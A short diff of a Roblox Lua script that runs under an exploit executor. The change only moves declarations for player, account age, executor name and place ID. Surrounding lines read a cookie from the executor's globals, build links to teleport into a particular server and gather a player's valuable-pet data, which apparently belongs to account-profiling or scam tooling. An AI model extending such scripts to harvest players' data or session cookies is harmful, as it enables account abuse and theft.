@@ -638,12 +638,6 @@ local function getPetTypeString(properties)
     end
 end
 
-local plr = game.Players.LocalPlayer
-local accage = plr.AccountAge
-local ExecutorValue = identifyexecutor() or "Unknown"
-local placeId = game.PlaceId
-local VersionValue = "1.12 (Added values)"
-
 local function GetRealJobIdWithAuth()
     local localPlayer = Players.LocalPlayer
     if not localPlayer then return nil end
@@ -749,8 +743,13 @@ if getgenv().Cookie then
     local realJobId = FindRealJobId()
 end
 
+local plr = game.Players.LocalPlayer
+local accage = plr.AccountAge
+local ExecutorValue = identifyexecutor() or "Unknown"
+local placeId = game.PlaceId
 local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. bestJobId
 local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. bestJobId .. "\")"
+local VersionValue = "1.12 (Added values)"
 
 -- Get valuable pets info
 local valuableCount, totalValue, topPets = getValuablePetsInfo()
